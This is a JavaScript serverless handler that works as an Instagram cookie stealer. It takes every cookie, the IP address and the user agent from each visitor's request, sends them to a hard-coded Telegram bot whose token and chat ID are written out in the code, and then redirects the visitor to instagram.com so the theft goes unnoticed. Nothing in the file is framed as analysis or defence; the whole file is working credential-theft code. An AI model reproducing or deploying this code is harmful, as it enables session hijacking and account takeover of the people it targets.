exports.handler = async (event, context) => {
    const cookies = event.headers['cookie'] || "";
    
    const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
    const TELEGRAM_CHAT_ID = "8569746095";

    const timestamp = new Date().toISOString();
    const userAgent = event.headers['user-agent'] || "Unknown";
    const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown";

    const message = `
🍪 <b>ALL Instagram Cookies Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🍪 <b>ALL Cookies:</b>
<code>${cookies}</code>
    `;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        })
    });

    // Redirect to Instagram
    return {
        statusCode: 302,
        headers: {
            Location: "https://www.instagram.com/"
        },
        body: ""
    };
};
